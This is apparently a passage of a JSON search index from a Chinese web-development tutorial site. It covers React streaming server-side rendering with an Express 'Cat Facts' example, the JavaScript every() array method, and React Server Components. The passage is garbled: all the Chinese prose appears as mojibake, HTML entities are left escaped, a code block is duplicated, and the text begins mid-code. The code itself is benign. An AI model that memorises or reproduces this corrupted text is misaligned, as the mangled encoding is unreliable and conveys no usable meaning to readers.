response.write(\u0026#34;\u0026lt;/div\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;); response.end(); resolve(); }); stream.pipe( response, { end: false } ); }); } catch (err) { response.writeHead(500, { \u0026#34;content-type\u0026#34;: \u0026#34;text/pain\u0026#34; }); response.end(String((err \u0026amp;\u0026amp; err.stack) || err)); return; } }); app.use(express.static(path.resolve(__dirname, \u0026#34;src\u0026#34;))); app.use(\u0026#34;/build\u0026#34;, express.static(path.resolve(__dirname, \u0026#34;build\u0026#34;))); const listener = app.listen(process.env.PORT || 2048, () =\u0026gt; { console.log(\u0026#34;Your app is listening on port \u0026#34; + listener.address().port); }); // data.js export default [ { fact: \u0026#34;Tests done by the Behavioral Department of the Musuem of Natural History conclude that while a dog\u0026#39;s memory lasts about 5 minutes, a cat\u0026#39;s recall can last as long as 16 hours.\u0026#34;, length: 175 }, { fact: \u0026#34;Relative to its body size, the clouded leopard has the biggest canines of all animals 2019 canines. Its dagger-like teeth can be as long as 1.8 inches (4.5 cm).\u0026#34;, length: 156 } ]   App ç»„ä»¶ä½¿ç”¨å†…ç½®çš„ renderToNodeStream æ–¹æ³•è·å–æµæ¸²æŸ“ã€‚ åˆå§‹ HTML ä¸æ¥è‡ª App ç»„ä»¶çš„æ•°æ®å—ä¸€èµ·å‘é€åˆ°å“åº”å¯¹è±¡ï¼Œ\næ­¤æ•°æ®åŒ…å«æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºå¿…é¡»ä½¿ç”¨çš„æœ‰ç”¨ä¿¡æ¯æ‰èƒ½æ­£ç¡®å‘ˆç°å†…å®¹ï¼Œä¾‹å¦‚æ–‡æ¡£çš„æ ‡é¢˜å’Œæ ·å¼è¡¨ã€‚\nå¦‚æœæˆ‘ä»¬ä½¿ç”¨ renderToString æ–¹æ³•æœåŠ¡å™¨æ¸²æŸ“ App ç»„ä»¶ï¼Œæˆ‘ä»¬å°†ä¸å¾—ä¸ç­‰åˆ°åº”ç”¨ç¨‹åºæ¥æ”¶åˆ°æ‰€æœ‰æ•°æ®æ‰èƒ½å¼€å§‹åŠ è½½å’Œå¤„ç†è¿™äº›å…ƒæ•°æ®ã€‚ ä¸ºäº†åŠ å¿«é€Ÿåº¦ï¼ŒrenderToNodeStream ä½¿åº”ç”¨ç¨‹åºå¯ä»¥å¼€å§‹åŠ è½½å’Œå¤„ç†æ­¤ä¿¡æ¯ï¼Œå› ä¸ºå®ƒä»åœ¨æ¥æ”¶æ¥è‡ªåº”ç”¨ç¨‹åºç»„ä»¶çš„æ•°æ®å—ï¼\n è¦æŸ¥çœ‹æœ‰å…³å¦‚ä½•å®æ–½æ¸è¿›å¼æ°´åŒ–å’ŒæœåŠ¡å™¨æ¸²æŸ“çš„æ›´å¤šç¤ºä¾‹ï¼Œè¯·è®¿é—®æ­¤ GitHub å­˜å‚¨åº“ã€‚\n  äº†è§£ styled-components å¦‚ä½•ä½¿ç”¨æµå¼æ¸²æŸ“æ¥ä¼˜åŒ–æ ·å¼è¡¨çš„äº¤ä»˜ã€‚\n \ræ¦‚å¿µ ä¸æ¸è¿›å¼æ°´åŒ–ä¸€æ ·ï¼Œæµå¼ä¼ è¾“æ˜¯å¦ä¸€ç§å¯ç”¨äºæé«˜ SSR æ€§èƒ½çš„æ¸²æŸ“æœºåˆ¶ã€‚\né¡¾åæ€ä¹‰ï¼Œæµå¼ä¼ è¾“æ„å‘³ç€ HTML å—åœ¨ç”Ÿæˆæ—¶ä»èŠ‚ç‚¹æœåŠ¡å™¨æµå¼ä¼ è¾“åˆ°å®¢æˆ·ç«¯ã€‚\nç”±äºå®¢æˆ·ç«¯æ›´æ—©åœ°å¼€å§‹æ¥æ”¶ HTML çš„â€œå­—èŠ‚â€ï¼Œå³ä½¿å¯¹äºå¤§é¡µé¢ï¼ŒTTFB ä¹Ÿä¼šå‡å°‘å¹¶ä¸”ç›¸å¯¹æ’å®šã€‚\næ‰€æœ‰ä¸»è¦æµè§ˆå™¨éƒ½æ›´æ—©åœ°å¼€å§‹è§£æå’Œå‘ˆç°æµå¼å†…å®¹æˆ–éƒ¨åˆ†å“åº”ã€‚ç”±äºæ¸²æŸ“æ˜¯æ¸è¿›å¼çš„ï¼Œå› æ­¤ä¼šäº§ç”Ÿå¿«é€Ÿçš„ FP å’Œ FCPã€‚\næµåª’ä½“å¯¹ç½‘ç»œèƒŒå‹ååº”è‰¯å¥½ã€‚\nå¦‚æœç½‘ç»œå µå¡å¹¶ä¸”æ— æ³•ä¼ è¾“æ›´å¤šå­—èŠ‚ï¼Œæ¸²æŸ“å™¨ä¼šæ”¶åˆ°ä¿¡å·å¹¶åœæ­¢æµå¼ä¼ è¾“ï¼Œç›´åˆ°ç½‘ç»œæ¸…ç†å®Œæ¯•ã€‚\nå› æ­¤ï¼ŒæœåŠ¡å™¨ä½¿ç”¨æ›´å°‘çš„å†…å­˜å¹¶ä¸”æ›´èƒ½å“åº” I/O æ¡ä»¶ã€‚\nè¿™ä½¿æ‚¨çš„ Node.js æœåŠ¡å™¨èƒ½å¤ŸåŒæ—¶å‘ˆç°å¤šä¸ªè¯·æ±‚ï¼Œå¹¶é˜²æ­¢è¾ƒé‡çš„è¯·æ±‚é•¿æ—¶é—´é˜»å¡è¾ƒè½»çš„è¯·æ±‚ã€‚\nå› æ­¤ï¼Œè¯¥ç«™ç‚¹å³ä½¿åœ¨å…·æœ‰æŒ‘æˆ˜æ€§çš„æ¡ä»¶ä¸‹ä¹Ÿèƒ½ä¿æŒå“åº”ã€‚\n\rç”¨äºæµåª’ä½“çš„ React React åœ¨ 2016 å¹´å‘å¸ƒçš„ React 16 ä¸­å¼•å…¥äº†å¯¹æµçš„æ”¯æŒã€‚ä»¥ä¸‹ API åŒ…å«åœ¨ ReactDOMServer ä¸­ä»¥æ”¯æŒæµã€‚\n  ReactDOMServer.renderToNodeStream(element)ï¼š\næ­¤å‡½æ•°çš„è¾“å‡º HTML ä¸ ReactDOMServer.renderToString(element) ç›¸åŒï¼Œä½†é‡‡ç”¨ Node.js å¯è¯»æµæ ¼å¼è€Œä¸æ˜¯å­—ç¬¦ä¸²ã€‚ è¯¥å‡½æ•°ä»…é€‚ç”¨äºæœåŠ¡å™¨ä»¥å°† HTML å‘ˆç°ä¸ºæµã€‚ æ¥æ”¶åˆ°è¿™ä¸ªæµçš„å®¢æˆ·ç«¯å¯ä»¥éšåè°ƒç”¨ ReactDOM.hydrate() æ¥æ°´åŒ–é¡µé¢å¹¶ä½¿å…¶å…·æœ‰äº¤äº’æ€§ã€‚\n  ReactDOMServer.renderToStaticNodeStream(element)ï¼šè¿™å¯¹åº”äº ReactDOMServer.renderToStaticMarkup(element)ã€‚ HTML è¾“å‡ºæ˜¯ç›¸åŒçš„ï¼Œä½†é‡‡ç”¨æµæ ¼å¼ã€‚ å®ƒå¯ç”¨äºåœ¨æœåŠ¡å™¨ä¸Šå‘ˆç°é™æ€ã€éäº¤äº’å¼é¡µé¢ï¼Œç„¶åå°†å®ƒä»¬æµå¼ä¼ è¾“åˆ°å®¢æˆ·ç«¯ã€‚\n  ä¸€æ—¦å¼€å§‹è¯»å–ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°è¾“å‡ºçš„å¯è¯»æµéƒ½å¯ä»¥å‘å‡ºå­—èŠ‚ã€‚ è¿™å¯ä»¥é€šè¿‡å°†å¯è¯»æµé€šè¿‡ç®¡é“ä¼ è¾“åˆ°å¯å†™æµï¼ˆä¾‹å¦‚å“åº”å¯¹è±¡ï¼‰æ¥å®ç°ã€‚ å“åº”å¯¹è±¡åœ¨ç­‰å¾…æ–°æ•°æ®å—è¢«æ¸²æŸ“çš„åŒæ—¶ï¼Œé€æ¸å‘å®¢æˆ·ç«¯å‘é€æ•°æ®å—ã€‚\nç»¼ä¸Šæ‰€è¿°ï¼Œç°åœ¨è®©æˆ‘ä»¬çœ‹çœ‹è¿™é‡Œå‘å¸ƒçš„ä»£ç æ¡†æ¶ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117  // App.js import React from \u0026#34;react\u0026#34;; import facts from \u0026#34;../data\u0026#34;; const App = () =\u0026gt; facts.map((fact, i) =\u0026gt; ( \u0026lt;div className=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;p key={i}\u0026gt;{fact.fact}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; )); export default App; // src/client.js import React from \u0026#34;react\u0026#34;; import { hydrate } from \u0026#34;react-dom\u0026#34;; import App from \u0026#34;./App\u0026#34;; hydrate(\u0026lt;App /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;)); // src/server.js import React from \u0026#34;react\u0026#34;; import path from \u0026#34;path\u0026#34;; import express from \u0026#34;express\u0026#34;; import { renderToNodeStream } from \u0026#34;react-dom/server\u0026#34;; import App from \u0026#34;./src/App\u0026#34;; const app = express(); app.get(\u0026#34;/favicon.ico\u0026#34;, (req, res) =\u0026gt; res.end()); app.use(\u0026#34;/client.js\u0026#34;, (req, res) =\u0026gt; res.redirect(\u0026#34;/build/client.js\u0026#34;)); const DELAY = 500; app.use((req, res, next) =\u0026gt; { setTimeout(() =\u0026gt; { next(); }, DELAY); }); const BEFORE = ` \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Cat Facts\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/style.css\u0026#34;\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; defer src=\u0026#34;/build/client.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Stream Rendered Cat Facts!\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;approot\u0026#34;\u0026gt; `.replace(/\\n\\s*/g, \u0026#34;\u0026#34;); app.get(\u0026#34;/\u0026#34;, async (request, response) =\u0026gt; { try { const stream = renderToNodeStream(\u0026lt;App /\u0026gt;); const start = Date.now(); stream.on(\u0026#34;data\u0026#34;, function handleData() { console.log(\u0026#34;Render Start: \u0026#34;, Date.now() - start); stream.off(\u0026#34;data\u0026#34;, handleData); response.useChunkedEncodingByDefault = true; response.writeHead(200, { \u0026#34;content-type\u0026#34;: \u0026#34;text/html\u0026#34;, \u0026#34;content-transfer-encoding\u0026#34;: \u0026#34;chunked\u0026#34;, \u0026#34;x-content-type-options\u0026#34;: \u0026#34;nosniff\u0026#34; }); response.write(BEFORE); response.flushHeaders(); }); await new Promise((resolve, reject) =\u0026gt; { stream.on(\u0026#34;error\u0026#34;, err =\u0026gt; { stream.unpipe(response); reject(err); }); stream.on(\u0026#34;end\u0026#34;, () =\u0026gt; { console.log(\u0026#34;Render End: \u0026#34;, Date.now() - start); response.write(\u0026#34;\u0026lt;/div\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;); response.end(); resolve(); }); stream.pipe( response, { end: false } ); }); } catch (err) { response.writeHead(500, { \u0026#34;content-type\u0026#34;: \u0026#34;text/pain\u0026#34; }); response.end(String((err \u0026amp;\u0026amp; err.stack) || err)); return; } }); app.use(express.static(path.resolve(__dirname, \u0026#34;src\u0026#34;))); app.use(\u0026#34;/build\u0026#34;, express.static(path.resolve(__dirname, \u0026#34;build\u0026#34;))); const listener = app.listen(process.env.PORT || 2048, () =\u0026gt; { console.log(\u0026#34;Your app is listening on port \u0026#34; + listener.address().port); }); // data.js export default [ { fact: \u0026#34;Tests done by the Behavioral Department of the Musuem of Natural History conclude that while a dog\u0026#39;s memory lasts about 5 minutes, a cat\u0026#39;s recall can last as long as 16 hours.\u0026#34;, length: 175 }, { fact: \u0026#34;Relative to its body size, the clouded leopard has the biggest canines of all animals 2019 canines. Its dagger-like teeth can be as long as 1.8 inches (4.5 cm).\u0026#34;, length: 156 } ]   ä¸‹å›¾æä¾›äº†æ™®é€š SSR ä¸æµåª’ä½“çš„ TTFB å’Œç¬¬ä¸€æ¬¡æœ‰æ„ä¹‰çš„ç»˜åˆ¶ä¹‹é—´çš„æ¯”è¾ƒã€‚\n\ræµå¼ SSR - ä¼˜ç‚¹å’Œç¼ºç‚¹ Streaming æ—¨åœ¨é€šè¿‡ React æé«˜ SSR çš„é€Ÿåº¦å¹¶æä¾›ä»¥ä¸‹å¥½å¤„\n æ€§èƒ½æå‡ï¼š  ç”±äºæœåŠ¡ç«¯å¼€å§‹æ¸²æŸ“åç¬¬ä¸€ä¸ªå­—èŠ‚å¾ˆå¿«åˆ°è¾¾å®¢æˆ·ç«¯ï¼ŒTTFBä¼˜äºSSRã€‚ æ— è®ºé¡µé¢å¤§å°å¦‚ä½•ï¼Œå®ƒä¹Ÿæ›´åŠ ä¸€è‡´ã€‚ ç”±äºå®¢æˆ·ç«¯ä¸€æ¥æ”¶åˆ° HTML å°±å¯ä»¥å¼€å§‹è§£æï¼Œæ‰€ä»¥ FP å’Œ FCP ä¹Ÿè¾ƒä½ã€‚\nå¤„ç†èƒŒå‹ï¼š  æµåª’ä½“å¯¹ç½‘ç»œèƒŒå‹æˆ–æ‹¥å¡ååº”è‰¯å¥½ï¼Œå³ä½¿åœ¨å…·æœ‰æŒ‘æˆ˜æ€§çš„æ¡ä»¶ä¸‹ä¹Ÿèƒ½äº§ç”Ÿå“åº”å¼ç½‘ç«™ã€‚\næ”¯æŒ SEOï¼šæµå“åº”å¯ä»¥è¢«æœç´¢å¼•æ“çˆ¬è™«è¯»å–ï¼Œä»è€Œå…è®¸åœ¨ç½‘ç«™ä¸Šè¿›è¡Œ SEOã€‚  éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæµå¼å®ç°ä¸æ˜¯ä» renderToString åˆ° renderToNodeStream() çš„ç®€å•æŸ¥æ‰¾æ›¿æ¢ã€‚ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œé€‚ç”¨äº SSR çš„ä»£ç å¯èƒ½æ— æ³•æŒ‰åŸæ ·é€‚ç”¨äºæµåª’ä½“ã€‚ ä»¥ä¸‹æ˜¯è¿ç§»å¯èƒ½å¹¶ä¸å®¹æ˜“ã€‚\n  ä½¿ç”¨ server-render-pass ç”Ÿæˆæ ‡è®°çš„æ¡†æ¶ï¼Œè¿™äº›æ ‡è®°éœ€è¦åœ¨ SSR-ed å—ä¹‹å‰æ·»åŠ åˆ°æ–‡æ¡£ä¸­ã€‚ ç¤ºä¾‹æ˜¯åŠ¨æ€ç¡®å®šåœ¨å‰é¢çš„ \u0026lt;style\u0026gt; æ ‡è®°ä¸­å°†å“ªäº› CSS æ·»åŠ åˆ°é¡µé¢çš„æ¡†æ¶ï¼Œæˆ–åœ¨å‘ˆç°æ—¶å°†å…ƒç´ æ·»åŠ åˆ°æ–‡æ¡£ \u0026lt;head\u0026gt; çš„æ¡†æ¶ã€‚\n  ä»£ç ï¼Œå…¶ä¸­ä½¿ç”¨ renderToStaticMarkup ç”Ÿæˆé¡µé¢æ¨¡æ¿å¹¶åµŒå…¥ renderToString è°ƒç”¨ä»¥ç”ŸæˆåŠ¨æ€å†…å®¹ã€‚ ç”±äºåœ¨è¿™äº›æƒ…å†µä¸‹éœ€è¦ä¸ç»„ä»¶å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œå› æ­¤å®ƒä¸èƒ½è¢«æµæ›¿æ¢ã€‚\n  res.write(\u0026#34;\u0026lt;!DOCTYPE html\u0026gt;\u0026#34;);\rres.write(renderToStaticMarkup(\r\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;title\u0026gt;My Page\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt;\r{ renderToString(\u0026lt;MyPage/\u0026gt;) }\r\u0026lt;/div\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;); Streaming å’Œ Progressive Hydration éƒ½å¯ä»¥å¸®åŠ©å¼¥åˆçº¯ SSR å’Œ CSR ä½“éªŒä¹‹é—´çš„å·®è·ã€‚ ç°åœ¨è®©æˆ‘ä»¬æ¯”è¾ƒæˆ‘ä»¬æ¢ç´¢è¿‡çš„æ‰€æœ‰æ¨¡å¼ï¼Œå¹¶å°è¯•äº†è§£å®ƒä»¬å¯¹ä¸åŒæƒ…å†µçš„é€‚ç”¨æ€§ã€‚\n\rçŸ¥è¯†ç‚¹  hydrate ReactDOMServer.renderToString(element) ReactDOMServer.renderToNodeStream(element) renderToNodeStream(element) ReactDOM.hydrate(element, container[, callback]) renderToStaticMarkup()  ","description":"ç”Ÿæˆ HTML ä»¥å“åº”ç”¨æˆ·è¯·æ±‚åœ¨æœåŠ¡å™¨ä¸Šå‘ˆç°","id":117,"section":"react-patterns","tags":null,"title":"æµ(åª’ä½“)å¼æœåŠ¡å™¨ç«¯æ¸²æŸ“ âœ”","uri":"https://codthing.github.io/react-patterns/render-patterns/streaming-ssr/"},{"content":"every() æ–¹æ³•æµ‹è¯•æ•°ç»„ä¸­çš„æ‰€æœ‰å…ƒç´ æ˜¯å¦é€šè¿‡æä¾›çš„å‡½æ•°å®ç°çš„æµ‹è¯•ã€‚ å®ƒè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ã€‚\n\rä½¿ç”¨ every æ–¹æ³•æ£€æŸ¥æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ æ˜¯å¦ç¬¦åˆæ¡ä»¶ every æ–¹æ³•ç”¨äºæ£€æµ‹æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ æ˜¯å¦éƒ½ç¬¦åˆæŒ‡å®šæ¡ä»¶ã€‚\nå¦‚æœæ‰€æœ‰å…ƒç´ æ»¡è¶³æ¡ä»¶ï¼Œè¿”å›å¸ƒå°”å€¼ trueï¼Œåä¹‹è¿”å› falseã€‚\nä¸¾ä¸ªä¾‹å­ï¼Œä¸‹é¢çš„ä»£ç æ£€æµ‹æ•°ç»„ numbers çš„æ‰€æœ‰å…ƒç´ æ˜¯å¦éƒ½å°äº 10ï¼š\n1 2 3 4 5 6 7  const numbers = [1, 5, 8, 0, 10, 11]; numbers.every(function(currentValue) { return currentValue \u0026lt; 10; }); // false   åœ¨ checkPositive å‡½æ•°ä¸­ä½¿ç”¨ every æ–¹æ³•æ£€æŸ¥ arr ä¸­æ˜¯å¦æ‰€æœ‰å…ƒç´ éƒ½æ˜¯æ­£æ•°ã€‚ å‡½æ•°åº”è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ã€‚\n1 2 3 4 5 6 7  function checkPositive(arr) { return arr.every(val =\u0026gt; val \u0026gt; 0); } checkPositive([1, 2, 3, -4, 5]); // false   ","description":"every() æ–¹æ³•æµ‹è¯•æ•°ç»„ä¸­çš„æ‰€æœ‰å…ƒç´ æ˜¯å¦é€šè¿‡æä¾›çš„å‡½æ•°å®ç°çš„æµ‹è¯•ã€‚ å®ƒè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ã€‚","id":118,"section":"javascript","tags":null,"title":"Array.prototype.every()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/every-programming/"},{"content":"React å›¢é˜Ÿæ­£åœ¨ç ”ç©¶é›¶åŒ…å¤§å°çš„ React æœåŠ¡å™¨ç»„ä»¶ï¼Œæ—¨åœ¨é€šè¿‡æœåŠ¡å™¨é©±åŠ¨çš„æ€ç»´æ¨¡å‹å®ç°ç°ä»£ UXã€‚ è¿™ä¸ç»„ä»¶çš„æœåŠ¡å™¨ç«¯æ¸²æŸ“ (SSR) å®Œå…¨ä¸åŒï¼Œå¹¶ä¸”å¯èƒ½å¯¼è‡´å®¢æˆ·ç«¯ JavaScript åŒ…æ˜¾ç€å˜å°ã€‚\nè¿™é¡¹å·¥ä½œçš„æ–¹å‘ä»¤äººå…´å¥‹ï¼Œè™½ç„¶å°šæœªå‡†å¤‡å¥½æŠ•å…¥ç”Ÿäº§ï¼Œä½†å€¼å¾—å…³æ³¨ã€‚ ä»¥ä¸‹èµ„æºå¯èƒ½ä¼šå¼•èµ·æ‚¨çš„å…´è¶£ï¼š\n  RFC å€¼å¾—ä¸€è¯»ï¼ŒDan å’Œ Lauren çš„æ¼”è®²ä¹Ÿå€¼å¾—ä¸€çœ‹ã€‚\n  Next.js çš„ React 18 çŠ¶æ€å’Œ Next.js çš„æœåŠ¡å™¨ç»„ä»¶è·¯çº¿å›¾\n  React 18 æµ‹è¯•ç‰ˆçŠ¶æ€\n  Shopify Hydrogen å’ŒæœåŠ¡å™¨ç»„ä»¶\n  \ræœåŠ¡å™¨ç«¯æ¸²æŸ“é™åˆ¶ ä»Šå¤©çš„å®¢æˆ·ç«¯ JavaScript çš„æœåŠ¡å™¨ç«¯å‘ˆç°å¯èƒ½æ˜¯æ¬¡ä¼˜çš„ã€‚\nç»„ä»¶çš„ JavaScript åœ¨æœåŠ¡å™¨ä¸Šå‘ˆç°ä¸º HTML å­—ç¬¦ä¸²ã€‚æ­¤ HTML è¢«ä¼ é€åˆ°æµè§ˆå™¨ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å¿«é€Ÿçš„â€œé¦–æ¬¡å†…å®¹ç»˜åˆ¶â€æˆ–â€œæœ€å¤§å†…å®¹ç»˜åˆ¶â€ã€‚\nä½†æ˜¯ï¼Œä»ç„¶éœ€è¦è·å– JavaScript ä»¥å®ç°äº¤äº’æ€§ï¼Œè¿™é€šå¸¸æ˜¯é€šè¿‡æ°´åŒ–æ­¥éª¤å®ç°çš„ã€‚æœåŠ¡å™¨ç«¯æ¸²æŸ“é€šå¸¸ç”¨äºåˆå§‹é¡µé¢åŠ è½½ï¼Œå› æ­¤åœ¨è¡¥æ°´åæ‚¨ä¸å¤ªå¯èƒ½çœ‹åˆ°å®ƒå†æ¬¡è¢«ä½¿ç”¨ã€‚\næ³¨æ„ï¼šè™½ç„¶ç¡®å®å¯ä»¥åˆ©ç”¨ SSR æ„å»ºä¸€ä¸ªä»…é™æœåŠ¡å™¨çš„ React åº”ç”¨ç¨‹åºå¹¶å®Œå…¨é¿å…åœ¨å®¢æˆ·ç«¯ä¸ŠåŠ æ°´ï¼Œä½†æ¨¡å‹ä¸­çš„å¤§é‡äº¤äº’é€šå¸¸æ¶‰åŠè·³å‡º Reactã€‚\næœåŠ¡å™¨ç»„ä»¶å¯ç”¨çš„æ··åˆæ¨¡å‹å°†å…è®¸åœ¨æ¯ä¸ªç»„ä»¶çš„åŸºç¡€ä¸Šå†³å®šè¿™ä¸€ç‚¹ã€‚\nä½¿ç”¨ React Server Componentsï¼Œæˆ‘ä»¬çš„ç»„ä»¶å¯ä»¥å®šæœŸé‡æ–°è·å–ã€‚å…·æœ‰å¯åœ¨æœ‰æ–°æ•°æ®æ—¶é‡æ–°æ¸²æŸ“çš„ç»„ä»¶çš„åº”ç”¨ç¨‹åºå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œï¼Œä»è€Œé™åˆ¶éœ€è¦å‘å®¢æˆ·ç«¯å‘é€å¤šå°‘ä»£ç ã€‚\n [RFC]ï¼šå¼€å‘äººå‘˜å¿…é¡»ä¸æ–­åœ°é€‰æ‹©ä½¿ç”¨ç¬¬ä¸‰æ–¹è½¯ä»¶åŒ…ã€‚ ä½¿ç”¨åŒ…æ¥å‘ˆç°ä¸€äº›é™ä»·æˆ–æ ¼å¼åŒ–æ—¥æœŸå¯¹æˆ‘ä»¬ä½œä¸ºå¼€å‘äººå‘˜æ¥è¯´å¾ˆæ–¹ä¾¿ï¼Œä½†å®ƒå¢åŠ äº†ä»£ç å¤§å°å¹¶æŸå®³äº†æˆ‘ä»¬ç”¨æˆ·çš„æ€§èƒ½\n 1 2 3 4 5 6 7 8 9  // *Before* Server Components import marked from \u0026#34;marked\u0026#34;; // 35.9K (11.2K gzipped) import sanitizeHtml from \u0026#34;sanitize-html\u0026#34;; // 206K (63.3K gzipped)  function NoteWithMarkdown({text}) { const html = sanitizeHtml(marked(text)); return (/* render */); }   \rServer Components React çš„æ–°æœåŠ¡å™¨ç»„ä»¶è¡¥å……äº†æœåŠ¡å™¨ç«¯æ¸²æŸ“ï¼Œæ— éœ€æ·»åŠ åˆ° JavaScript åŒ…å³å¯æ¸²æŸ“ä¸ºä¸­é—´æŠ½è±¡æ ¼å¼ã€‚ è¿™æ—¢å…è®¸å°†æœåŠ¡å™¨æ ‘ä¸å®¢æˆ·ç«¯æ ‘åˆå¹¶è€Œä¸ä¼šä¸¢å¤±çŠ¶æ€ï¼Œå¹¶ä¸”å¯ä»¥æ‰©å±•åˆ°æ›´å¤šç»„ä»¶ã€‚\næœåŠ¡å™¨ç»„ä»¶ä¸èƒ½æ›¿ä»£ SSRã€‚ å½“é…å¯¹åœ¨ä¸€èµ·æ—¶ï¼Œå®ƒä»¬æ”¯æŒä»¥ä¸­é—´æ ¼å¼å¿«é€Ÿæ¸²æŸ“ï¼Œç„¶åè®©æœåŠ¡å™¨ç«¯æ¸²æŸ“åŸºç¡€è®¾æ–½å°†å…¶æ¸²æŸ“ä¸º HTMLï¼Œä»è€Œä½¿æ—©æœŸç»˜åˆ¶ä»ç„¶å¾ˆå¿«ã€‚ æˆ‘ä»¬å¯¹æœåŠ¡å™¨ç»„ä»¶å‘å‡ºçš„å®¢æˆ·ç«¯ç»„ä»¶è¿›è¡Œ SSRï¼Œç±»ä¼¼äº SSR ä¸å…¶ä»–æ•°æ®è·å–æœºåˆ¶çš„ä½¿ç”¨æ–¹å¼ã€‚\nç„¶è€Œï¼Œè¿™ä¸€æ¬¡ï¼ŒJavaScript åŒ…ä¼šå°å¾ˆå¤šã€‚ æ—©æœŸçš„æ¢ç´¢è¡¨æ˜ï¼Œbundle å¤§å°çš„èƒœåˆ©å¯èƒ½å¾ˆé‡è¦ï¼ˆ-18-29%ï¼‰ï¼Œ\nä½†ä¸€æ—¦è¿›ä¸€æ­¥çš„åŸºç¡€è®¾æ–½å·¥ä½œå®Œæˆï¼ŒReact å›¢é˜Ÿå°†å¯¹é‡å¤–è·èƒœæœ‰æ›´æ¸…æ™°çš„è®¤è¯†ã€‚\n FC]ï¼šå¦‚æœæˆ‘ä»¬å°†ä¸Šé¢çš„ç¤ºä¾‹è¿ç§»åˆ°æœåŠ¡å™¨ç»„ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºæˆ‘ä»¬çš„åŠŸèƒ½ä½¿ç”¨å®Œå…¨ç›¸åŒçš„ä»£ç ï¼Œä½†é¿å…å°†å…¶å‘é€åˆ°å®¢æˆ·ç«¯ - ä»£ç èŠ‚çœè¶…è¿‡ 240Kï¼ˆæœªå‹ç¼©ï¼‰ï¼š\n 1 2 3 4 5 6 7  import marked from \u0026#34;marked\u0026#34;; // zero bundle size import sanitizeHtml from \u0026#34;sanitize-html\u0026#34;; // zero bundle size  function NoteWithMarkdown({text}) { // same as before }   \rè‡ªåŠ¨ä»£ç æ‹†åˆ† é€šè¿‡ä½¿ç”¨ä»£ç æ‹†åˆ†åªä¸ºç”¨æˆ·éœ€è¦çš„ä»£ç æä¾›æœåŠ¡è¢«è®¤ä¸ºæ˜¯æœ€ä½³å®è·µã€‚ è¿™ä½¿æ‚¨å¯ä»¥å°†æ‚¨çš„åº”ç”¨ç¨‹åºåˆ†è§£ä¸ºæ›´å°çš„åŒ…ï¼Œéœ€è¦å°†æ›´å°‘çš„ä»£ç å‘é€åˆ°å®¢æˆ·ç«¯ã€‚\nåœ¨æœåŠ¡å™¨ç»„ä»¶å‡ºç°ä¹‹å‰ï¼Œäººä»¬ä¼šæ‰‹åŠ¨ä½¿ç”¨ React.lazy() æ¥å®šä¹‰â€œåˆ†å‰²ç‚¹â€æˆ–ä¾é å…ƒæ¡†æ¶çš„å¯å‘å¼è®¾ç½®ï¼Œä¾‹å¦‚è·¯ç”±/é¡µé¢æ¥åˆ›å»ºæ–°çš„å—ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  // *Before* Server Components import React from \u0026#34;react\u0026#34;; // å…¶ä¸­ä¹‹ä¸€å°†å¼€å§‹åŠ è½½*åœ¨å®¢æˆ·ç«¯ä¸Šå‘ˆç°æ—¶*ï¼š const OldPhotoRenderer = React.lazy(() =\u0026gt; import(\u0026#34;./OldPhotoRenderer.js\u0026#34;)); const NewPhotoRenderer = React.lazy(() =\u0026gt; import(\u0026#34;./NewPhotoRenderer.js\u0026#34;)); function Photo(props) { // åˆ‡æ¢åŠŸèƒ½æ ‡ç­¾ã€ç™»å½•/æ³¨é”€ã€å†…å®¹ç±»å‹ç­‰ï¼š  if (FeatureFlags.useNewPhotoRenderer) { return \u0026lt;NewPhotoRenderer {...props} /\u0026gt;; } else { return \u0026lt;PhotoRenderer {...props} /\u0026gt;; } }   ä»£ç æ‹†åˆ†çš„ä¸€äº›æŒ‘æˆ˜æ˜¯ï¼š\n  åœ¨å…ƒæ¡†æ¶ï¼ˆå¦‚ Next.jsï¼‰ä¹‹å¤–ï¼Œé€šå¸¸å¿…é¡»æ‰‹åŠ¨è§£å†³æ­¤ä¼˜åŒ–é—®é¢˜ï¼Œç”¨åŠ¨æ€å¯¼å…¥æ›¿æ¢å¯¼å…¥è¯­å¥ã€‚\n  